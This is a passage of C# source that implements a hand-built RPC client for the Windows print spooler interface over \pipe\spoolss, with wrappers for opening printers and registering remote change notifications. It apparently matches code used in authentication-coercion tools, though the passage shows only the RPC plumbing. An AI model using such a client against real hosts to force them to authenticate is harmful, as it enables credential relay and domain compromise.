				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x12,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
				0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x13,0x00,0x10,
				0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,
				0x00,0x00,0x00,0x00,0x14,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x15,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x16,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,
				0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x17,0x00,0x10,0x00,
				0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,
				0x00,0x00,0x00,0x18,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,
				0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x19,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1a,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,
				0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1b,0x00,0x10,0x00,0x32,
				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x1c,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,
				0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1d,0x00,0x10,0x00,0x30,0xe0,0x00,0x00,0x00,0x00,0x38,0x00,0x40,0x00,0x44,0x02,0x0a,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x01,0x00,0x00,0x32,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x1e,0x00,0x10,0x00,0x32,
				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x1f,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,
				0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x20,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x21,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,
				0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x22,0x00,0x10,0x00,0x32,0x00,
				0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,
				0x00,0x23,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,
				0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x24,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x25,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,
				0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x26,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,
				0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x27,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,
				0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x28,0x00,0x10,0x00,0x32,
				0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,
				0x00,0x00,0x29,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,
				0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2a,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2b,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,
				0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2c,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2d,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2e,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
				0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x2f,0x00,0x10,
				0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,
				0x00,0x00,0x00,0x00,0x30,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,
				0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x31,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x32,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x33,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x34,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,
				0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x35,0x00,
				0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,
				0x48,0x00,0x00,0x00,0x00,0x36,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x48,0x00,0x00,0x00,0x00,0x37,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x38,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x39,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,
				0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3a,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,
				0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3b,0x00,0x10,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,
				0x3c,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,
				0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3d,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3e,0x00,0x10,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x44,0x01,0x0a,
				0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x3f,0x00,0x08,0x00,0x32,0x00,0x00,0x00,
				0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x40,0x00,0x08,0x00,0x32,0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x41,0x00,0x38,0x00,0x30,0x40,
				0x00,0x00,0x00,0x00,0x3c,0x00,0x08,0x00,0x46,0x07,0x0a,0x05,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x36,0x00,0x48,0x00,0x08,
				0x00,0x08,0x00,0x48,0x00,0x10,0x00,0x08,0x00,0x0b,0x00,0x18,0x00,0x02,0x00,0x48,0x00,0x20,0x00,0x08,0x00,0x0b,0x00,0x28,0x00,0x3a,0x00,0x70,0x00,
				0x30,0x00,0x08,0x00,0x00

        };

		private static byte[] MIDL_TypeFormatStringx86 = new byte[] {
				0x00,0x00,0x12,0x08,0x25,0x5c,0x11,0x04,0x02,0x00,0x30,0xa0,0x00,0x00,0x11,0x00,0x0e,0x00,0x1b,0x00,0x01,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0x01,
				0x5b,0x16,0x03,0x08,0x00,0x4b,0x5c,0x46,0x5c,0x04,0x00,0x04,0x00,0x12,0x00,0xe6,0xff,0x5b,0x08,0x08,0x5b,0x11,0x04,0x02,0x00,0x30,0xe1,0x00,0x00,
				0x30,0x41,0x00,0x00,0x12,0x00,0x48,0x00,0x1b,0x01,0x02,0x00,0x19,0x00,0x0c,0x00,0x01,0x00,0x06,0x5b,0x16,0x03,0x14,0x00,0x4b,0x5c,0x46,0x5c,0x10,
				0x00,0x10,0x00,0x12,0x00,0xe6,0xff,0x5b,0x06,0x06,0x08,0x08,0x08,0x08,0x5b,0x1b,0x03,0x14,0x00,0x19,0x00,0x08,0x00,0x01,0x00,0x4b,0x5c,0x48,0x49,
				0x14,0x00,0x00,0x00,0x01,0x00,0x10,0x00,0x10,0x00,0x12,0x00,0xc2,0xff,0x5b,0x4c,0x00,0xc9,0xff,0x5b,0x16,0x03,0x10,0x00,0x4b,0x5c,0x46,0x5c,0x0c,
				0x00,0x0c,0x00,0x12,0x00,0xd0,0xff,0x5b,0x08,0x08,0x08,0x08,0x5b,0x00
        };

		private static byte[] MIDL_TypeFormatStringx64 = new byte[] {
				0x00,0x00,0x12,0x08,0x25,0x5c,0x11,0x04,0x02,0x00,0x30,0xa0,0x00,0x00,0x11,0x00,0x0e,0x00,0x1b,0x00,0x01,0x00,0x19,0x00,0x00,0x00,0x01,0x00,0x01,
				0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,0x08,0x40,0x36,0x5b,0x12,0x00,0xe6,0xff,0x11,0x04,0x02,0x00,0x30,0xe1,0x00,0x00,0x30,0x41,0x00,0x00,
				0x12,0x00,0x38,0x00,0x1b,0x01,0x02,0x00,0x19,0x00,0x0c,0x00,0x01,0x00,0x06,0x5b,0x1a,0x03,0x18,0x00,0x00,0x00,0x0a,0x00,0x06,0x06,0x08,0x08,0x08,
				0x36,0x5c,0x5b,0x12,0x00,0xe2,0xff,0x21,0x03,0x00,0x00,0x19,0x00,0x08,0x00,0x01,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x4c,0x00,0xda,0xff,0x5c,0x5b,
				0x1a,0x03,0x18,0x00,0x00,0x00,0x08,0x00,0x08,0x08,0x08,0x40,0x36,0x5b,0x12,0x00,0xda,0xff,0x00
        };

		[SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		public rprn()
		{
			Guid interfaceId = new Guid("12345678-1234-ABCD-EF00-0123456789AB");
			if (IntPtr.Size == 8)
			{
				InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, "\\pipe\\spoolss", 1, 0);
			}
			else
			{
				InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, "\\pipe\\spoolss", 1, 0);
			}
		}

		[SecurityPermission(SecurityAction.Demand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		~rprn()
		{
			freeStub();
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DEVMODE_CONTAINER
		{
			Int32 cbBuf;
			IntPtr pDevMode;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct RPC_V2_NOTIFY_OPTIONS_TYPE
		{
			UInt16 Type;
			UInt16 Reserved0;
			UInt32 Reserved1;
			UInt32 Reserved2;
			UInt32 Count;
			IntPtr pFields;
		};

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct RPC_V2_NOTIFY_OPTIONS
		{
			UInt32 Version;
			UInt32 Reserved;
			UInt32 Count;
			/* [unique][size_is] */
			RPC_V2_NOTIFY_OPTIONS_TYPE pTypes;
		};

		[SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		public Int32 RpcOpenPrinter(string pPrinterName, out IntPtr pHandle, string pDatatype, ref DEVMODE_CONTAINER pDevModeContainer, Int32 AccessRequired)
		{
			IntPtr result = IntPtr.Zero;
			IntPtr intptrPrinterName = Marshal.StringToHGlobalUni(pPrinterName);
			IntPtr intptrDatatype = Marshal.StringToHGlobalUni(pDatatype);
			pHandle = IntPtr.Zero;
			try
			{
				if (IntPtr.Size == 8)
				{
					result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(36), pPrinterName, out pHandle, pDatatype, ref pDevModeContainer, AccessRequired);
				}
				else
				{
					IntPtr tempValue = IntPtr.Zero;
					GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
					IntPtr tempValuePointer = handle.AddrOfPinnedObject();
					GCHandle handleDevModeContainer = GCHandle.Alloc(pDevModeContainer, GCHandleType.Pinned);
					IntPtr tempValueDevModeContainer = handleDevModeContainer.AddrOfPinnedObject();
					try
					{
						result = CallNdrClientCall2x86(34, intptrPrinterName, tempValuePointer, intptrDatatype, tempValueDevModeContainer, new IntPtr(AccessRequired));
						// each pinvoke work on a copy of the arguments (without an out specifier)
						// get back the data
						pHandle = Marshal.ReadIntPtr(tempValuePointer);
					}
					finally
					{
						handle.Free();
						handleDevModeContainer.Free();
					}
				}
			}
			catch (SEHException)
			{
				Trace.WriteLine("RpcOpenPrinter failed 0x" + Marshal.GetExceptionCode().ToString("x"));
				return Marshal.GetExceptionCode();
			}
			finally
			{
				if (intptrPrinterName != IntPtr.Zero)
					Marshal.FreeHGlobal(intptrPrinterName);
				if (intptrDatatype != IntPtr.Zero)
					Marshal.FreeHGlobal(intptrDatatype);
			}
			return (int)result.ToInt64();
		}

		[SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		public Int32 RpcClosePrinter(ref IntPtr ServerHandle)
		{
			IntPtr result = IntPtr.Zero;
			try
			{
				if (IntPtr.Size == 8)
				{
					result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(1076), ref ServerHandle);
				}
				else
				{
					IntPtr tempValue = ServerHandle;
					GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
					IntPtr tempValuePointer = handle.AddrOfPinnedObject();
					try
					{
						result = CallNdrClientCall2x86(1018, tempValuePointer);
						// each pinvoke work on a copy of the arguments (without an out specifier)
						// get back the data
						ServerHandle = Marshal.ReadIntPtr(tempValuePointer);
					}
					finally
					{
						handle.Free();
					}
				}
			}
			catch (SEHException)
			{
				Trace.WriteLine("RpcClosePrinter failed 0x" + Marshal.GetExceptionCode().ToString("x"));
				return Marshal.GetExceptionCode();
			}
			return (int)result.ToInt64();
		}

		[SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
		public Int32 RpcRemoteFindFirstPrinterChangeNotificationEx(
			/* [in] */ IntPtr hPrinter,
			/* [in] */ UInt32 fdwFlags,
			/* [in] */ UInt32 fdwOptions,
			/* [unique][string][in] */ string pszLocalMachine,
			/* [in] */ UInt32 dwPrinterLocal)
		{
			IntPtr result = IntPtr.Zero;
			IntPtr intptrLocalMachine = Marshal.StringToHGlobalUni(pszLocalMachine);
			try
			{
				if (IntPtr.Size == 8)
				{
					result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2308), hPrinter, fdwFlags, fdwOptions, pszLocalMachine, dwPrinterLocal, IntPtr.Zero);
				}
				else
				{
					try
					{
						result = CallNdrClientCall2x86(2178, hPrinter, new IntPtr(fdwFlags), new IntPtr(fdwOptions), intptrLocalMachine, new IntPtr(dwPrinterLocal), IntPtr.Zero);
						// each pinvoke work on a copy of the arguments (without an out specifier)
						// get back the data
					}
					finally
					{
					}
				}
			}
			catch (SEHException)
			{
				Trace.WriteLine("RpcRemoteFindFirstPrinterChangeNotificationEx failed 0x" + Marshal.GetExceptionCode().ToString("x"));
				return Marshal.GetExceptionCode();
			}
			finally
			{
				if (intptrLocalMachine != IntPtr.Zero)
					Marshal.FreeHGlobal(intptrLocalMachine);
			}
			return (int)result.ToInt64();
		}

    
        private byte[] MIDL_ProcFormatString;
        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private GCHandle bindinghandle;
        private string PipeName;

        // important: keep a reference on delegate to avoid CallbackOnCollectedDelegate exception
        bind BindDelegate;
        unbind UnbindDelegate;
        allocmemory AllocateMemoryDelegate = AllocateMemory;
        freememory FreeMemoryDelegate = FreeMemory;

        // 5 seconds
        public UInt32 RPCTimeOut = 5000;

        [StructLayout(LayoutKind.Sequential)]
        private struct COMM_FAULT_OFFSETS
        {
            public short CommOffset;
            public short FaultOffset;
        }

        [System.Diagnostics.CodeAnalysis.SuppressMessage("Microsoft.Design", "CA1049:TypesThatOwnNativeResourcesShouldBeDisposable"), StructLayout(LayoutKind.Sequential)]
        private struct GENERIC_BINDING_ROUTINE_PAIR
        {
            public IntPtr Bind;
            public IntPtr Unbind;
        }
        

        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_VERSION
        {
            public ushort MajorVersion;
            public ushort MinorVersion;


            public static RPC_VERSION INTERFACE_VERSION = new RPC_VERSION(1, 0);
            public static RPC_VERSION SYNTAX_VERSION = new RPC_VERSION(2, 0);

            public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                MajorVersion = InterfaceVersionMajor;
                MinorVersion = InterfaceVersionMinor;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_SYNTAX_IDENTIFIER
        {
            public Guid SyntaxGUID;
            public RPC_VERSION SyntaxVersion;
        }

        

        [StructLayout(LayoutKind.Sequential)]
        private struct RPC_CLIENT_INTERFACE
        {
            public uint Length;
            public RPC_SYNTAX_IDENTIFIER InterfaceId;
            public RPC_SYNTAX_IDENTIFIER TransferSyntax;
            public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
            public uint RpcProtseqEndpointCount;
            public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
            public IntPtr Reserved;
            public IntPtr InterpreterInfo;
            public uint Flags;

            public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B,
                                                              0x10,
                                                              0x48, 0x60);

            public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
            {
                Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
                RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
                InterfaceId = new RPC_SYNTAX_IDENTIFIER();
                InterfaceId.SyntaxGUID = iid;
                InterfaceId.SyntaxVersion = rpcVersion;
                rpcVersion = new RPC_VERSION(2, 0);
                TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
                TransferSyntax.SyntaxGUID = IID_SYNTAX;
                TransferSyntax.SyntaxVersion = rpcVersion;
                DispatchTable = IntPtr.Zero;
                RpcProtseqEndpointCount = 0u;
                RpcProtseqEndpoint = IntPtr.Zero;
                Reserved = IntPtr.Zero;
                InterpreterInfo = IntPtr.Zero;
                Flags = 0u;
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MIDL_STUB_DESC
        {
            public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
            public IntPtr pfnAllocate;
            public IntPtr pfnFree;
            public IntPtr pAutoBindHandle;
            public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
            public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
            public IntPtr /*EXPR_EVAL*/ apfnExprEval;
            public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
            public IntPtr pFormatTypes;
            public int fCheckBounds;
            /* Ndr library version. */
            public uint Version;
            public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
            public int MIDLVersion;
            public IntPtr CommFaultOffsets;
            // New fields for version 3.0+
            public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
            // Notify routines - added for NT5, MIDL 5.0
            public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
            public IntPtr mFlags;
            // International support routines - added for 64bit post NT5
            public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
            public IntPtr ProxyServerInfo;
            public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
            // Fields up to now present in win2000 release.

            public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                    IntPtr pfnAllocatePtr, IntPtr pfnFreePtr, IntPtr aGenericBindingRoutinePairsPtr)
            {
                pFormatTypes = pFormatTypesPtr;
                RpcInterfaceInformation = RpcInterfaceInformationPtr;
                CommFaultOffsets = IntPtr.Zero;
                pfnAllocate = pfnAllocatePtr;
                pfnFree = pfnFreePtr;
                pAutoBindHandle = IntPtr.Zero;
                apfnNdrRundownRoutines = IntPtr.Zero;
                aGenericBindingRoutinePairs = aGenericBindingRoutinePairsPtr;
                apfnExprEval = IntPtr.Zero;
                aXmitQuintuple = IntPtr.Zero;
                fCheckBounds = 1;
                Version = 0x50002u;
                pMallocFreeStruct = IntPtr.Zero;
                MIDLVersion = 0x8000253;
                aUserMarshalQuadruple = IntPtr.Zero;
                NotifyRoutineTable = IntPtr.Zero;
                mFlags = new IntPtr(0x00000001);
                CsRoutineTables = IntPtr.Zero;
                ProxyServerInfo = IntPtr.Zero;
                pExprInfo = IntPtr.Zero;
            }
        }

        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);

            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);
            GENERIC_BINDING_ROUTINE_PAIR bindingObject = new GENERIC_BINDING_ROUTINE_PAIR();
            // important: keep a reference to avoid CallbakcOnCollectedDelegate Exception
            BindDelegate = Bind;
            UnbindDelegate = Unbind;
            bindingObject.Bind = Marshal.GetFunctionPointerForDelegate((bind)BindDelegate);
            bindingObject.Unbind = Marshal.GetFunctionPointerForDelegate((unbind)UnbindDelegate);

            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);
            bindinghandle = GCHandle.Alloc(bindingObject, GCHandleType.Pinned);

            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate),
                                                            bindinghandle.AddrOfPinnedObject());

